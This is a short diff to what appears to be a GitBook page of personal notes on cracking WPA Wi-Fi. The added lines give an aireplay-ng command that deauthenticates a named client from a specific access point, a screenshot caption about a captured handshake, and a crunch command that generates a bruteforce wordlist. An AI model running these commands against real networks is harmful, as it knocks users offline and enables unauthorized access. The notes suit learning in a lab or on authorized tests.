@@ -77,5 +77,11 @@ Just wait for some time, then after receiving enough  packets in the `#Data` col
 
 `airodump-ng --bssid 98:A9:42:27:A2:CA --channel 10 --write wpa_handshake wlan0mon` to create a handshake .cap file.&#x20;
 
+`aireplay-ng --deauth 20 -a 98:A9:42:27:A2:CA -c A8:9C:ED:3A:5E:B7 wlan0mon` where `-a` is AP macAddr and `-c` is client macAddr.
 
+<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-55 (1).png" alt=""><figcaption><p>captured handshake</p></figcaption></figure>
+
+using the `crunch` utility to create a word list for bruteforcing.
+
+`crunch 6 6 abc123 -o test.txt -t a@@bb` use the man crunch for guides.
 
